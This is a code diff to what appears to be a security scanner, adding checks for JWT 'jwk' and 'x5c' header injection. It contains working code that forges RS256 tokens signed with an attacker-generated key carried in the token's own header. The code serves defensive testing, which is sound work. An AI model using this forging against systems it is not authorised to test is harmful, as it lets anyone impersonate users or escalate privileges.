@@ -288,6 +288,94 @@ async def check_jwt_kid_injection(client: HttpClient, target_url: str, token: st
     ]
 
 
+def _b64uint(value: int) -> str:
+    return _b64url_encode(value.to_bytes((value.bit_length() + 7) // 8 or 1, "big"))
+
+
+def _rsa_forge(token: str, header_extra: dict) -> str | None:
+    """Sign the token's (unchanged) payload with a fresh RSA key via RS256, adding ``header_extra``
+    (the ``jwk``/``x5c`` that carries our public key). None if `cryptography` isn't available."""
+    try:
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.asymmetric import padding, rsa
+    except ImportError:
+        return None
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    header = {"alg": "RS256", "typ": "JWT", **header_extra(key)}  # type: ignore[operator]
+    payload_b64 = token.split(".")[1]
+    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    signature = key.sign(f"{header_b64}.{payload_b64}".encode(), padding.PKCS1v15(), hashes.SHA256())
+    return f"{header_b64}.{payload_b64}.{_b64url_encode(signature)}"
+
+
+def _jwk_header(key) -> dict:  # noqa: ANN001 — key is an rsa.RSAPrivateKey
+    nums = key.public_key().public_numbers()
+    return {"jwk": {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "dc-jwk",
+                    "n": _b64uint(nums.n), "e": _b64uint(nums.e)}}
+
+
+def _x5c_header(key) -> dict:  # noqa: ANN001 — key is an rsa.RSAPrivateKey
+    import datetime
+
+    from cryptography import x509
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.x509.oid import NameOID
+
+    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "dastcore")])
+    now = datetime.datetime.now(datetime.UTC)
+    cert = (
+        x509.CertificateBuilder().subject_name(name).issuer_name(name)
+        .public_key(key.public_key()).serial_number(x509.random_serial_number())
+        .not_valid_before(now - datetime.timedelta(days=1)).not_valid_after(now + datetime.timedelta(days=1))
+        .sign(key, hashes.SHA256())
+    )
+    der = cert.public_bytes(serialization.Encoding.DER)
+    return {"x5c": [base64.b64encode(der).decode("ascii")]}  # x5c uses standard base64 (RFC 7515)
+
+
+async def _check_embedded_key(
+    client: HttpClient, target_url: str, token: str, *, header_extra: dict, rule_id: str, name: str
+) -> list[Finding]:
+    """Shared oracle for jwk/x5c injection: the server must verify signatures (bad one rejected), and
+    then accept a token signed by *our* key carried in the token's own header → attacker can forge any token."""
+    if not looks_like_jwt(token):
+        return []
+    control = await _verifies_signatures(client, target_url, token)
+    if control is None:
+        return []
+    _, bad = control
+    forged = _rsa_forge(token, header_extra)  # type: ignore[arg-type]
+    if forged is None:
+        return []
+    resp = await _send_bearer(client, target_url, forged)
+    if not _accepted(resp):
+        return []
+    assert resp is not None
+    return [_jwt_finding(
+        rule_id, name, "critical", target_url,
+        f"a token signed with an attacker key supplied in the token's own header was accepted "
+        f"({resp.status_code}) while a tampered signature was rejected ({bad.status_code}) — the server "
+        "trusts the key embedded in the JWT, so any token (any role/sub) can be forged",
+        resp,
+    )]
+
+
+async def check_jwt_jwk_injection(client: HttpClient, target_url: str, token: str) -> list[Finding]:
+    """`jwk` header injection: the server verifies against the RSA public key embedded in the token."""
+    return await _check_embedded_key(
+        client, target_url, token, header_extra=_jwk_header,  # type: ignore[arg-type]
+        rule_id="jwt-jwk-injection", name="JWT jwk header injection (attacker-supplied signing key)",
+    )
+
+
+async def check_jwt_x5c_injection(client: HttpClient, target_url: str, token: str) -> list[Finding]:
+    """`x5c` header injection: the server trusts a self-signed certificate chain carried in the token."""
+    return await _check_embedded_key(
+        client, target_url, token, header_extra=_x5c_header,  # type: ignore[arg-type]
+        rule_id="jwt-x5c-injection", name="JWT x5c header injection (self-signed cert trusted)",
+    )
+
+
 def _jwk_to_pem(jwk: dict) -> bytes | None:
     """Reconstruct an RSA public key PEM from a JWK (n, e). Needs `cryptography`; None if
     unavailable or the JWK isn't a usable RSA key."""
